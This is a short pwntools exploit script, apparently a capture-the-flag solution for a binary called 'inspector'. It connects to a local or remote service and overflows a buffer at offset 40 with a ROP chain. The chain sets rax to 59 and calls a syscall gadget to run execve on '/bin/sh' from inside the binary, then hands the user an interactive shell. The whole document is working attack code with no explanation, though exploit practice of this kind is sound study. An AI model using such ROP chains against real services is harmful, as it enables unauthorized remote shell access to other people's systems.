from pwn import *
context(arch = 'amd64', os = 'linux')

progname = './inspector'

exe = context.binary = ELF(progname)
host = args.HOST or 'localhost'
port = int(args.PORT or 1234)

gdbscript = '''
break *(main+40)
continue
'''

def local(argv=[], *a, **kw):
    if args.GDB:
        r = process(progname, raw=False, *a, **kw)
        gdb.attach(r, gdbscript)
        return r
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    io.send('bh1642\r\n')
    io.recvline() # Wait
    return io

start = local if args.LOCAL else remote

io = start()
print(io.recvline())
r = ROP(exe)
syscall = r.find_gadget(['syscall', 'ret']).address
r.raw(r.find_gadget(['pop rax', 'ret']))
r.raw(59)
r.call(syscall, [next(exe.search('/bin/sh\x00')), 0, 0])
io.send(fit({
    40: r.chain(),
}) + '\r\n')
io.interactive()
